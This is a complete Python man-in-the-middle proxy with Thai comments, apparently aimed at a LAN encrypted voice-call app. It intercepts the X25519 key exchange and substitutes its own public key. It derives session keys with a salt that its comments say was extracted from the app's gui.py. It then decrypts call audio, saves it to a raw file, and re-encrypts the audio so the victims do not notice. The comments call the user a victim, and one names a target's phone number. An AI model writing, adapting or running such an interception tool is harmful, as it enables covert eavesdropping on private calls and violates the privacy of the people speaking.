import socket
import struct
import threading
import os
import time
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

# --- CONFIGURATION (ปรับตามข้อมูลของคุณ) ---
# เครื่องโจร (MITM) จะรอฟังที่พอร์ตนี้
MITM_LISTEN_IP = "127.0.0.1"
MITM_LISTEN_PORT = 9000 

# เป้าหมายปลายทาง (Receiver - เบอร์ 0640570453)
TARGET_REAL_IP = "127.0.0.1"
TARGET_REAL_PORT = 6001  

# *** กุญแจลับที่เจาะได้จาก gui.py ***
HARDCODED_SALT = b'DDbRDthATPBGP3yB2kjLto1Ph2un-lkYNaEklnyut3k='

class MITMProxy:
    def __init__(self):
        # สร้างกุญแจของโจร เตรียมไว้หลอกทั้งสองฝั่ง
        self.rogue_priv = x25519.X25519PrivateKey.generate()
        self.rogue_pub = self.rogue_priv.public_key()
        
        self.session_key_caller = None # คีย์ที่ใช้คุยกับคนโทร
        self.session_key_target = None # คีย์ที่ใช้คุยกับคนรับ

        # ไฟล์สำหรับแอบบันทึกเสียง (Raw PCM)
        self.dump_file = open("intercepted_audio.raw", "wb")

    def derive_key(self, private_key, peer_pub_bytes):
        # จำลองกระบวนการสร้างคีย์ให้เหมือน Client เป๊ะๆ
        try:
            peer_pub = x25519.X25519PublicKey.from_public_bytes(peer_pub_bytes)
            shared = private_key.exchange(peer_pub)
            hkdf = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=HARDCODED_SALT, # ใช้ Salt เดียวกับแอปจริง
                info=b"lan-call-aesgcm",
            )
            return AESGCM(hkdf.derive(shared))
        except Exception as e:
            print(f"[!] Key derivation failed: {e}")
            return None

    def start(self):
        # เปิด Server รอรับการเชื่อมต่อจาก Caller
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((MITM_LISTEN_IP, MITM_LISTEN_PORT))
        server.listen(1)
        
        print(f"💀 MITM Attacker รอเหยื่ออยู่ที่ {MITM_LISTEN_IP}:{MITM_LISTEN_PORT}")
        print(f"🎯 เป้าหมายปลายทางคือ {TARGET_REAL_IP}:{TARGET_REAL_PORT}")
        print(f"💾 กำลังบันทึกเสียงที่ถอดรหัสได้ลงไฟล์ 'intercepted_audio.raw'...")

        try:
            client_sock, addr = server.accept()
            print(f"[+] เหยื่อ (Caller) หลงเข้ามาแล้วจาก {addr}")
            self.handle_connection(client_sock)
        except KeyboardInterrupt:
            print("\nStopping...")
        finally:
            self.dump_file.close()
            server.close()

    def handle_connection(self, caller_sock):
        # เชื่อมต่อไปหาเครื่องปลายทาง (Target) จริงๆ
        try:
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((TARGET_REAL_IP, TARGET_REAL_PORT))
            print(f"[+] เชื่อมต่อกับปลายทางสำเร็จ")
        except Exception as e:
            print(f"[-] เชื่อมต่อปลายทางไม่ได้: {e}")
            caller_sock.close()
            return

        # สร้าง Thread ทำงาน 2 ทิศทาง
        t1 = threading.Thread(target=self.bridge, args=(caller_sock, target_sock, "Caller->Target"))
        t2 = threading.Thread(target=self.bridge, args=(target_sock, caller_sock, "Target->Caller"))
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    def bridge(self, src, dst, direction):
        while True:
            try:
                # 1. อ่าน Header (5 bytes)
                header = b""
                while len(header) < 5:
                    chunk = src.recv(5 - len(header))
                    if not chunk: return
                    header += chunk
                
                msg_type = header[:1]
                size = struct.unpack("!I", header[1:])[0]

                # 2. อ่าน Payload
                payload = b""
                while len(payload) < size:
                    chunk = src.recv(size - len(payload))
                    if not chunk: return
                    payload += chunk

                # --- ช่วงสับเปลี่ยนข้อมูล (The Attack) ---
                
                # [K] Key Exchange: ดักจับ PubKey แล้วเปลี่ยนเป็นของเรา
                if msg_type == b'K':
                    print(f"[*] Intercepted KEY Exchange ({direction})")
                    
                    if direction == "Caller->Target":
                        # เก็บ Key จริงของ Caller ไว้สร้าง Session
                        self.session_key_caller = self.derive_key(self.rogue_priv, payload)
                    else:
                        # เก็บ Key จริงของ Target ไว้สร้าง Session
                        self.session_key_target = self.derive_key(self.rogue_priv, payload)
                    
                    # **เปลี่ยน Payload เป็น PubKey ของโจร**
                    payload = self.rogue_pub.public_bytes(
                        encoding=serialization.Encoding.Raw,
                        format=serialization.PublicFormat.Raw
                    )

                # [A] Audio: ถอดรหัส -> บันทึก -> เข้ารหัสใหม่
                elif msg_type == b'A':
                    # เลือก Key ให้ถูกคู่
                    decrypt_key = self.session_key_caller if direction == "Caller->Target" else self.session_key_target
                    encrypt_key = self.session_key_target if direction == "Caller->Target" else self.session_key_caller
                    
                    if decrypt_key and encrypt_key:
                        try:
                            # ถอดรหัส (Decrypt)
                            nonce = payload[:12]
                            ciphertext = payload[12:]
                            raw_audio = decrypt_key.decrypt(nonce, ciphertext, None)
                            
                            # >>> ได้เสียงดิบแล้ว! (บันทึกหรือฟัง) <<<
                            if raw_audio:
                                self.dump_file.write(raw_audio)
                                # print(f"  > Decrypted {len(raw_audio)} bytes audio", end='\r')
                            
                            # เข้ารหัสใหม่ (Re-encrypt)
                            new_nonce = os.urandom(12)
                            new_ciphertext = encrypt_key.encrypt(new_nonce, raw_audio, None)
                            payload = new_nonce + new_ciphertext
                        except Exception as e:
                            pass # Decrypt error (อาจจะเป็นแพ็คเก็ตแรกๆ)

                # ส่งข้อมูลต่อไปยังปลายทาง
                dst.sendall(header + payload)

            except Exception:
                break
        src.close()
        dst.close()

if __name__ == "__main__":
    MITMProxy().start()